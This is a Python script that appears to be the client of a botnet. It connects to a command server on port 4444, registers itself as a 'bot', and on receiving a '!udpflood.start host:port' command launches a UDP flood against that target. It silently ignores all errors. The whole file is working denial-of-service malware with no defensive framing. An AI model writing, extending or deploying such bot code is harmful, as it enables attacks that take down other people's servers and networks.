from time import sleep
import sys
from client_modules import udp
from threading import Thread
import os,sys,socket

IP = '127.0.0.1'
PORT = 4444
BUFFER_SIZE = 1024

def create_socket():
    client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    client_socket.connect((IP,PORT))
    client_socket.send('bot')
    return client_socket

def handle_commands(command):
    try:
        if "!udpflood.start" in command:
            options = command.split(' ')
            addr = options[1].split(':')
            target  = addr[0]
            port    = addr[1]
            udp.flood(target,port)
        else:
            pass
    except:
        pass

def receive_commands(client_socket):
    while True:
        try:
            command = client_socket.recv(BUFFER_SIZE)
            handle_commands(command)
        except:
            pass

if __name__ == '__main__':
    receive_commands(create_socket())
